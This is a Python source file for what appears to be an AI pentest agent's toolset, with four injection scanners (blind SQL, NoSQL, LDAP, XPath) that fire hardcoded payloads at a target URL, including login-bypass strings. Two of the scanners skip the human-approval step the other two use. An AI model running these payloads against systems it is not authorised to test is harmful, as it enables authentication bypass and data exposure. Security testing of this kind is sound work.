import json
import requests
import re
import urllib3
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Blind SQL Injection (Time & Boolean)
# ==========================================
@tool("blind_sqli_scanner")
def blind_sqli_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk Blind SQL Injection (time-based dan boolean-based).
    Berguna ketika error-based SQLi not menampilkan error di response.
    params: comma-separated parameter names to test
    """
    tool_name = "Blind SQLi Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting blind SQLi scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"Blind SQL Injection scan pada {url}",
        context=f"Testing time-based (SLEEP) dan boolean-based payloads pada params: {params or 'default'}",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    import time
    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else ["id", "user_id", "q", "search", "page", "cat", "item"]

    vulnerabilities = []

    # Time-based payloads (per DB)
    time_payloads = [
        ("' AND SLEEP(4)-- -", "MySQL"),
        ("1 AND SLEEP(4)-- -", "MySQL"),
        ("'; SELECT pg_sleep(4)-- -", "PostgreSQL"),
        ("1; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
        ("' OR SLEEP(4)-- -", "MySQL"),
        ("1' AND SLEEP(4)#", "MySQL"),
    ]

    # Boolean-based payloads (true vs false condition)
    boolean_payloads = [
        ("' AND '1'='1", "' AND '1'='2"),  # true vs false
        ("1 AND 1=1", "1 AND 1=2"),
        ("' OR 1=1-- -", "' OR 1=2-- -"),
    ]

    logger.add_log(tool_name, "PROCESSING", "Testing time-based blind SQLi")
    for param in param_list:
        if check_cancelled(logger): break
        for payload, db_type in time_payloads:
            try:
                rate_limiter.wait(domain)
                start = time.monotonic()
                r = requests.get(
                    f"{url}?{param}={quote(payload)}",
                    timeout=10, verify=False
                )
                elapsed = time.monotonic() - start

                if elapsed >= 3.5:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "db_type": db_type,
                        "type": "Blind SQLi (Time-Based)",
                        "evidence": f"Response delayed {elapsed:.1f}s",
                        "severity": "Critical"
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"Blind SQLi (time) confirmed: param={param}, DB={db_type}, delay={elapsed:.1f}s")
                    break  # confirmed for this param
            except requests.Timeout:
                # Timeout can also indicate successful sleep injection
                vulnerabilities.append({
                    "parameter": param,
                    "payload": payload,
                    "db_type": db_type,
                    "type": "Blind SQLi (Time-Based, Timeout)",
                    "evidence": "Request timed out — potential successful sleep injection",
                    "severity": "Critical"
                })
                logger.add_log(tool_name, "WARNING", f"Blind SQLi timeout: param={param}")
                break
            except Exception:
                pass

    logger.add_log(tool_name, "PROCESSING", "Testing boolean-based blind SQLi")
    for param in param_list:
        if check_cancelled(logger): break
        if any(v["parameter"] == param for v in vulnerabilities):
            continue  # already confirmed for this param

        for true_payload, false_payload in boolean_payloads:
            try:
                rate_limiter.wait(domain)
                r_true = requests.get(f"{url}?{param}={quote(true_payload)}", timeout=5, verify=False)
                rate_limiter.wait(domain)
                r_false = requests.get(f"{url}?{param}={quote(false_payload)}", timeout=5, verify=False)

                # Significant response difference between true and false condition
                len_diff = abs(len(r_true.text) - len(r_false.text))
                content_diff = r_true.text != r_false.text

                if len_diff > 50 and content_diff:
                    vulnerabilities.append({
                        "parameter": param,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "type": "Blind SQLi (Boolean-Based)",
                        "evidence": f"Response length diff: {len_diff} bytes between true/false conditions",
                        "severity": "Critical"
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"Blind SQLi (boolean) possible: param={param}, diff={len_diff} bytes")
                    break
            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "params_tested": param_list
    }
    logger.add_log(tool_name, "SUCCESS", f"Blind SQLi scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 2: NoSQL Injection Scanner
# ==========================================
@tool("nosql_injection_scanner")
def nosql_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk NoSQL Injection (MongoDB, CouchDB).
    Test operator injection: $gt, $ne, $where, $regex patterns.
    params: comma-separated parameter names to test
    """
    tool_name = "NoSQL Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting NoSQL injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"NoSQL injection scan pada {url}",
        context=f"Testing MongoDB operator injection payloads ($gt, $ne, $where)",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "username", "password", "email", "id", "user", "search", "query"
    ]

    vulnerabilities = []

    # GET-based NoSQL payloads
    get_payloads = [
        # MongoDB operator injection
        ({"$gt": ""}, "MongoDB $gt operator"),
        ({"$ne": "invalid"}, "MongoDB $ne operator"),
        ({"$regex": ".*"}, "MongoDB $regex operator"),
        ("';return true;//", "MongoDB $where JS injection"),
        ("true, $where: '1==1", "MongoDB $where injection"),
        # Array injection
        (["admin", "invalid"], "Array injection"),
    ]

    # POST JSON-based payloads (most common for NoSQL)
    json_payloads = [
        # Auth bypass
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$ne": "invalid"}}',
        '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
        '{"$where": "this.username == this.username"}',
        '{"username": "admin\' || \'x\'==\'x", "password": "x"}',
    ]

    # Test GET params
    logger.add_log(tool_name, "PROCESSING", "Testing NoSQL injection via GET params")
    for param in param_list:
        if check_cancelled(logger): break
        for payload, payload_desc in get_payloads:
            try:
                rate_limiter.wait(domain)
                if isinstance(payload, dict):
                    # Send as array notation: param[$gt]=
                    for op, val in payload.items():
                        test_url = f"{url}?{param}[{op}]={quote(str(val))}"
                        r = requests.get(test_url, timeout=5, verify=False)
                        if r.status_code == 200 and any(kw in r.text.lower() for kw in
                            ["dashboard", "welcome", "profile", "logout", "success"]):
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": f"{param}[{op}]={val}",
                                "description": payload_desc,
                                "type": "NoSQL Injection (GET)",
                                "severity": "Critical"
                            })
                            logger.add_log(tool_name, "WARNING", f"NoSQL injection confirmed: {payload_desc}")
                            break
            except Exception:
                pass

    # Test POST JSON
    logger.add_log(tool_name, "PROCESSING", "Testing NoSQL injection via POST JSON")
    for jp in json_payloads:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            r = requests.post(
                url,
                data=jp,
                headers={"Content-Type": "application/json"},
                timeout=5, verify=False
            )
            if r.status_code == 200 and any(kw in r.text.lower() for kw in
                ["dashboard", "welcome", "profile", "logout", "success", "token", "authenticated"]):
                vulnerabilities.append({
                    "payload": jp,
                    "type": "NoSQL Injection (POST JSON)",
                    "evidence": r.text[:200],
                    "severity": "Critical"
                })
                logger.add_log(tool_name, "WARNING", "NoSQL injection via POST JSON confirmed!")
                break
        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities)
    }
    logger.add_log(tool_name, "SUCCESS", f"NoSQL injection scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 3: LDAP Injection Scanner
# ==========================================
@tool("ldap_injection_scanner")
def ldap_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk LDAP Injection vulnerability.
    Sering found di enterprise apps yang pake LDAP authentication (Active Directory).
    params: comma-separated parameter names (biasanya username, user, email)
    """
    tool_name = "LDAP Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting LDAP injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "username", "user", "email", "login", "uid", "cn"
    ]

    # LDAP injection payloads
    ldap_payloads = [
        ("*", "Wildcard — dump all users"),
        ("*)(uid=*))(|(uid=*", "Classic LDAP injection — auth bypass"),
        ("admin)(&)", "LDAP auth bypass"),
        ("*)(|(objectclass=*)", "Objectclass dump"),
        (")(|(password=*)", "Password attribute dump attempt"),
        ("admin*", "Wildcard prefix on admin"),
        ("*)(|(cn=*", "CN dump"),
        ("\\00", "Null byte injection"),
    ]

    vulnerabilities = []

    for param in param_list:
        if check_cancelled(logger): break
        for payload, description in ldap_payloads:
            try:
                rate_limiter.wait(domain)
                # Test GET
                r_get = requests.get(
                    f"{url}?{param}={quote(payload)}",
                    timeout=5, verify=False
                )
                # Test POST
                rate_limiter.wait(domain)
                r_post = requests.post(
                    url,
                    data={param: payload, "password": "anything"},
                    timeout=5, verify=False
                )

                # LDAP injection indicators:
                # 1. Login success with wildcard
                # 2. LDAP error messages leaked
                # 3. Different response compared to normal input

                ldap_error_patterns = [
                    "ldap", "ldap_search", "ldap_bind", "invalid dn syntax",
                    "invalid filter", "unwillingToPerform", "sizelimit exceeded",
                    "objectclass", "distinguishedName"
                ]

                for r in [r_get, r_post]:
                    if any(p in r.text.lower() for p in ldap_error_patterns):
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "description": description,
                            "type": "LDAP Error Disclosure / Injection",
                            "evidence": next((p for p in ldap_error_patterns if p in r.text.lower()), ""),
                            "severity": "High"
                        })
                        logger.add_log(tool_name, "WARNING", f"LDAP error disclosed: param={param}")
                        break

                    # Auth bypass check
                    if payload in ("*", "*)(uid=*))(|(uid=*") and r.status_code == 200:
                        if any(kw in r.text.lower() for kw in ["dashboard", "welcome", "logout", "profile"]):
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "description": description,
                                "type": "LDAP Authentication Bypass",
                                "severity": "Critical"
                            })
                            logger.add_log(tool_name, "WARNING", f"LDAP auth bypass: param={param}")
                            break

            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "note": "LDAP injection most common in enterprise apps with Active Directory auth"
    }
    logger.add_log(tool_name, "SUCCESS", f"LDAP injection scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 4: XPath Injection Scanner
# ==========================================
@tool("xpath_injection_scanner")
def xpath_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk XPath Injection vulnerability.
    XPath injection terjadi di aplikasi yang query XML data store using user input.
    params: comma-separated parameter names to test
    """
    tool_name = "XPath Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting XPath injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "username", "user", "id", "search", "query", "name", "category"
    ]

    # XPath injection payloads
    xpath_payloads = [
        ("' or '1'='1", "Classic XPath auth bypass"),
        ("' or 1=1 or '1'='1", "Extended XPath bypass"),
        ("'] | //* | //*['", "XPath wildcard dump"),
        ("x' or name()='username", "Node name injection"),
        ("' or count(/*)>0 or '1'='1", "Boolean XPath probe"),
        ("admin' or 'a'='a", "Admin bypass"),
        ("1' and count(//user)>0 and '1'='1", "User enum probe"),
        ("' and count(//password)>0 and '", "Password node probe"),
    ]

    vulnerabilities = []
    xpath_error_patterns = [
        "xpath", "xquery", "xml query", "invalid expression",
        "syntax error in xpath", "expected token", "unterminated string"
    ]

    for param in param_list:
        if check_cancelled(logger): break
        for payload, description in xpath_payloads:
            try:
                rate_limiter.wait(domain)
                r = requests.get(
                    f"{url}?{param}={quote(payload)}",
                    timeout=5, verify=False
                )

                # Check for XPath errors (disclosure)
                if any(ep in r.text.lower() for ep in xpath_error_patterns):
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "description": description,
                        "type": "XPath Error Disclosure",
                        "evidence": "XPath error message in response",
                        "severity": "Medium"
                    })
                    logger.add_log(tool_name, "WARNING", f"XPath error disclosed: param={param}")
                    break

                # Check for auth bypass
                if r.status_code == 200 and any(kw in r.text.lower() for kw in
                    ["dashboard", "welcome", "logout", "admin", "success"]):
                    rate_limiter.wait(domain)
                    # Verify by testing clearly wrong payload
                    r_normal = requests.get(
                        f"{url}?{param}={quote('normalvalue_xyz')}",
                        timeout=5, verify=False
                    )
                    if r_normal.status_code != 200 or r.text != r_normal.text:
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "description": description,
                            "type": "XPath Authentication Bypass",
                            "severity": "Critical"
                        })
                        logger.add_log(tool_name, "WARNING", f"XPath auth bypass: param={param}")
                        break
            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities)
    }
    logger.add_log(tool_name, "SUCCESS", f"XPath injection scan complete. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)
